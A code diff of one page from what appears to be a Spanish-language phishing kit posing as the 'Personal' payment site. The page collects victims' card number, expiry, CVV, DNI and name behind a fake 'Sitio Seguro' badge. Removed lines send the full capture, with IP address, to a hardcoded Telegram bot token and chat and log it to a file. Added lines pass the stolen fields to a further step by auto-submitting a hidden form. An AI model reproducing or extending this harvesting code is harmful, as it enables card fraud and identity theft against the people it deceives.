@@ -1,89 +1,30 @@
 <?php
-/**
- * STEP 6 - FINAL - DNI, Nombre y ENVÍO A TELEGRAM
- */
-file_put_contents(__DIR__ . '/debug.txt', "Step6 ejecutado: " . date('Y-m-d H:i:s') . "\n", FILE_APPEND);
-file_put_contents(__DIR__ . '/debug.txt', "POST recibido: " . print_r($_POST, true) . "\n", FILE_APPEND);
-// CONFIGURACIÓN TELEGRAM
-$TELEGRAM_BOT_TOKEN = '8234170971:AAH7Z8ySIHDs1tZmWTbFnAc90-RKdh26fwY';
-$TELEGRAM_CHAT_ID = '-1003832913889';
-
-// Recibir datos de pasos anteriores
 $phone = isset($_POST['phone']) ? trim($_POST['phone']) : '';
 $amount = isset($_POST['amount']) ? trim($_POST['amount']) : '';
 $card = isset($_POST['card']) ? trim($_POST['card']) : '';
-$venc = isset($_POST['venc']) ? trim($_POST['venc']) : '';
 $cv = isset($_POST['cv']) ? trim($_POST['cv']) : '';
+$venc = isset($_POST['venc']) ? trim($_POST['venc']) : '';
 
-// ¿Se envió el formulario final?
 if(isset($_POST['dni']) && isset($_POST['name'])) {
-    $dni = trim($_POST['dni']);
-    $name = trim($_POST['name']);
-    
-    // Info técnica
-    $ip = $_SERVER['REMOTE_ADDR'];
-    $user_agent = $_SERVER['HTTP_USER_AGENT'];
-    $fecha = date('Y-m-d H:i:s');
-    
-    // Construir mensaje
-    $mensaje = "🔔 <b>NUEVA CAPTURA COMPLETA</b>\n";
-    $mensaje .= "━━━━━━━━━━━━━━━\n\n";
-    
-    $mensaje .= "📱 <b>Datos Personales:</b>\n";
-    $mensaje .= "├ Teléfono: <code>" . htmlspecialchars($phone) . "</code>\n";
-    $mensaje .= "├ Nombre: " . htmlspecialchars($name) . "\n";
-    $mensaje .= "└ DNI: " . htmlspecialchars($dni) . "\n\n";
-    
-    $mensaje .= "💳 <b>Datos Bancarios:</b>\n";
-    $mensaje .= "├ Tarjeta: <code>" . htmlspecialchars($card) . "</code>\n";
-    $mensaje .= "├ Vencimiento: " . htmlspecialchars($venc) . "\n";
-    $mensaje .= "├ CVV: <code>" . htmlspecialchars($cv) . "</code>\n";
-    $mensaje .= "└ Monto: $" . htmlspecialchars($amount) . "\n\n";
-    
-    $mensaje .= "🌐 <b>Información Técnica:</b>\n";
-    $mensaje .= "├ IP: <code>" . $ip . "</code>\n";
-    $mensaje .= "├ Navegador: " . substr(htmlspecialchars($user_agent), 0, 50) . "...\n";
-    $mensaje .= "└ Fecha: " . $fecha . "\n\n";
-    
-    $mensaje .= "⚠️ <i>Sistema de pasos múltiples</i>";
-    
-    // Enviar a Telegram
-    $url = "https://api.telegram.org/bot" . $TELEGRAM_BOT_TOKEN . "/sendMessage";
-    
-    $data = array(
-        'chat_id' => $TELEGRAM_CHAT_ID,
-        'text' => $mensaje,
-        'parse_mode' => 'HTML'
-    );
-    
-    $ch = curl_init($url);
-    curl_setopt($ch, CURLOPT_POST, 1);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
-    
-    $result = curl_exec($ch);
-    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-    curl_close($ch);
-    
-    $enviado = ($http_code == 200);
-    
-    // Guardar en log
-    $log_file = __DIR__ . '/capturas_steps.log';
-    $log_entry = sprintf(
-        "[%s] Tel: %s | Tarjeta: %s | Nombre: %s | Enviado: %s\n",
-        $fecha,
-        $phone,
-        $card,
-        $name,
-        $enviado ? 'SI' : 'NO'
-    );
-    @file_put_contents($log_file, $log_entry, FILE_APPEND);
-    
-    // Redirigir a success
-    header('Location: success.php');
+    ?>
+    <form id="autoForm" method="POST" action="step7.php">
+        <input type="hidden" name="phone" value="<?php echo htmlspecialchars($phone); ?>">
+        <input type="hidden" name="amount" value="<?php echo htmlspecialchars($amount); ?>">
+        <input type="hidden" name="card" value="<?php echo htmlspecialchars($card); ?>">
+        <input type="hidden" name="cv" value="<?php echo htmlspecialchars($cv); ?>">
+        <input type="hidden" name="venc" value="<?php echo htmlspecialchars($venc); ?>">
+        <input type="hidden" name="dni" value="<?php echo htmlspecialchars($_POST['dni']); ?>">
+        <input type="hidden" name="name" value="<?php echo htmlspecialchars($_POST['name']); ?>">
+    </form>
+    <script>document.getElementById('autoForm').submit();</script>
+    <?php
     exit;
+}
+
+// Detectar tipo de tarjeta
+$tipo_tarjeta = 'visa';
+if (preg_match('/^5[1-5]/', $card) || preg_match('/^2[2-7]/', $card)) {
+    $tipo_tarjeta = 'mastercard';
 }
 ?>
 <!DOCTYPE html>
@@ -91,66 +32,234 @@ if(isset($_POST['dni']) && isset($_POST['name'])) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Datos del Titular | Personal</title>
-    <link rel="stylesheet" href="css/op/bootstrap.min.css">
-    <link rel="stylesheet" href="css/op/styles.css">
+    <title>Datos del titular | Personal</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #2a2a2a;
+            color: #fff;
+        }
+        
+        .header {
+            background: #2a2a2a;
+            border-bottom: 1px solid #3a3a3a;
+            color: #fff;
+            padding: 15px 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .logo { font-size: 18px; font-weight: 500; }
+        .sitio-seguro { font-size: 12px; }
+        
+        .container {
+            max-width: 600px;
+            margin: 60px auto;
+            padding: 0 20px;
+        }
+        
+        h1 {
+            text-align: center;
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 50px;
+        }
+        
+        /* TARJETA */
+        .tarjeta {
+            width: 100%;
+            max-width: 400px;
+            height: 240px;
+            margin: 0 auto 50px;
+            border-radius: 16px;
+            padding: 25px 30px;
+            position: relative;
+            background: <?php echo $tipo_tarjeta === 'mastercard' ? 'linear-gradient(135deg, #eb001b 0%, #f79e1b 100%)' : '#1e3a8a'; ?>;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.4);
+        }
+        
+        .tarjeta-chip {
+            width: 50px;
+            height: 40px;
+            background: linear-gradient(135deg, #ffd700 0%, #daa520 100%);
+            border-radius: 8px;
+            margin-bottom: 40px;
+        }
+        
+        .tarjeta-numero {
+            font-size: 26px;
+            letter-spacing: 4px;
+            font-family: 'Courier New', Courier, monospace;
+            margin-bottom: 30px;
+            font-weight: 400;
+        }
+        
+        .tarjeta-bottom {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-end;
+        }
+        
+        .tarjeta-nombre {
+            font-size: 14px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        .tarjeta-venc {
+            font-size: 14px;
+            font-family: 'Courier New', Courier, monospace;
+        }
+        
+        .tarjeta-logo {
+            position: absolute;
+            top: 20px;
+            right: 25px;
+            font-size: 18px;
+            font-weight: bold;
+        }
+        
+        /* FORMULARIO */
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 14px;
+            color: #fff;
+        }
+        
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            background: #1a1a1a;
+            border: 1px solid #444;
+            border-radius: 6px;
+            color: #fff;
+            font-size: 16px;
+        }
+        
+        input:focus {
+            outline: none;
+            border-color: #5d8bf4;
+        }
+        
+        .botones {
+            display: flex;
+            gap: 12px;
+            margin-top: 40px;
+        }
+        
+        button {
+            flex: 1;
+            padding: 14px;
+            border: none;
+            border-radius: 6px;
+            font-size: 15px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        
+        .btn-volver {
+            background: transparent;
+            border: 1px solid #5d8bf4;
+            color: #5d8bf4;
+        }
+        
+        .btn-volver:hover { background: rgba(93, 139, 244, 0.1); }
+        
+        .btn-pagar {
+            background: #28a745;
+            color: #fff;
+            font-size: 16px;
+            font-weight: 600;
+        }
+        
+        .btn-pagar:hover { background: #218838; }
+        .btn-pagar:disabled {
+            background: #444;
+            cursor: not-allowed;
+        }
+    </style>
 </head>
-<body style="background-color: #e5e5e5;">
-    <div class="container-fluid">
-        <div class="row">
-            <div class="col-12 p-0">
-                <header class="header">
-                    <nav class="px-0 pt-0">
-                        <div class="d-flex justify-content-between align-items-center" style="padding: 20px;">
-                            <div><img src="assets/flow.svg" style="height: 40px;"></div>
-                            <div><img src="assets/secure.svg" style="height: 30px;"></div>
-                        </div>
-                    </nav>
-                </header>
+<body>
+    <div class="header">
+        <div class="logo">personal flow</div>
+        <div class="sitio-seguro">🔒 Sitio Seguro</div>
+    </div>
 
-                <div class="row justify-content-center mt-5">
-                    <div class="col-12 text-center">
-                        <h1 style="color: #333; font-size: 28px; margin-bottom: 30px;">Datos del titular</h1>
-                    </div>
+    <div class="container">
+        <h1>Datos del titular</h1>
 
-                    <div class="col-11 col-sm-6">
-                        <form method="POST" action="step6.php">
-                            <input type="hidden" name="phone" value="<?php echo htmlspecialchars($phone); ?>">
-                            <input type="hidden" name="amount" value="<?php echo htmlspecialchars($amount); ?>">
-                            <input type="hidden" name="card" value="<?php echo htmlspecialchars($card); ?>">
-                            <input type="hidden" name="venc" value="<?php echo htmlspecialchars($venc); ?>">
-                            <input type="hidden" name="cv" value="<?php echo htmlspecialchars($cv); ?>">
-                            
-                            <div class="form-group">
-                                <label style="color: #666;">DNI</label>
-                                <input type="text" name="dni" id="dni" class="form-control" placeholder="12345678" maxlength="8" style="height: 50px; font-size: 16px;" required>
-                            </div>
-
-                            <div class="form-group">
-                                <label style="color: #666;">Nombre y Apellido</label>
-                                <input type="text" name="name" id="name" class="form-control" placeholder="Juan Pérez" maxlength="50" style="height: 50px; font-size: 16px;" required>
-                            </div>
-
-                            <div class="text-center mt-4">
-                                <button type="button" onclick="window.history.back()" class="btn btn-secondary px-4 py-2 mr-2">Volver</button>
-                                <button type="submit" id="btnPagar" class="btn btn-success px-5 py-3" disabled style="background: #28a745; border: none; font-size: 20px; font-weight: bold;">PAGAR</button>
-                            </div>
-                        </form>
-                    </div>
-                </div>
+        <div class="tarjeta">
+            <div class="tarjeta-chip"></div>
+            <div class="tarjeta-numero"><?php echo htmlspecialchars($card); ?></div>
+            <div class="tarjeta-bottom">
+                <div class="tarjeta-nombre" id="displayNombre">Nombre y Apellido</div>
+                <div class="tarjeta-venc"><?php echo htmlspecialchars($venc); ?></div>
             </div>
+            <div class="tarjeta-logo"><?php echo $tipo_tarjeta === 'mastercard' ? 'Mastercard' : 'VISA'; ?></div>
         </div>
+
+        <form method="POST" action="step6.php">
+            <input type="hidden" name="phone" value="<?php echo htmlspecialchars($phone); ?>">
+            <input type="hidden" name="amount" value="<?php echo htmlspecialchars($amount); ?>">
+            <input type="hidden" name="card" value="<?php echo htmlspecialchars($card); ?>">
+            <input type="hidden" name="cv" value="<?php echo htmlspecialchars($cv); ?>">
+            <input type="hidden" name="venc" value="<?php echo htmlspecialchars($venc); ?>">
+            
+            <div class="form-group">
+                <label>DNI</label>
+                <input type="text" name="dni" id="dni" placeholder="12345678" maxlength="8" required autocomplete="off">
+            </div>
+
+            <div class="form-group">
+                <label>Nombre y Apellido</label>
+                <input type="text" name="name" id="name" placeholder="Juan Pérez" maxlength="50" required autocomplete="off">
+            </div>
+
+            <div class="botones">
+                <button type="button" class="btn-volver" onclick="window.history.back()">Volver</button>
+                <button type="submit" class="btn-pagar" id="btnPagar" disabled>PAGAR</button>
+            </div>
+        </form>
     </div>
 
     <script src="javascript/query.min.js"></script>
     <script>
-        function validar() {
-            var dni = $('#dni').val();
-            var nombre = $('#name').val();
-            $('#btnPagar').prop('disabled', !(dni.length >= 7 && nombre.length >= 3));
-        }
-        
-        $('#dni, #name').on('keyup', validar);
+        $(document).ready(function(){
+            function validar() {
+                var dni = $('#dni').val();
+                var nombre = $('#name').val();
+                
+                // Actualizar nombre en tarjeta
+                if (nombre.length > 0) {
+                    $('#displayNombre').text(nombre.toUpperCase());
+                } else {
+                    $('#displayNombre').text('Nombre y Apellido');
+                }
+                
+                if (dni.length >= 7 && nombre.length >= 3) {
+                    $('#btnPagar').prop('disabled', false);
+                } else {
+                    $('#btnPagar').prop('disabled', true);
+                }
+            }
+            
+            $('#dni, #name').on('input', validar);
+            
+            // Solo números en DNI
+            $('#dni').on('keypress', function(e){
+                if (e.which < 48 || e.which > 57) {
+                    e.preventDefault();
+                }
+            });
+        });
     </script>
 </body>
 </html>
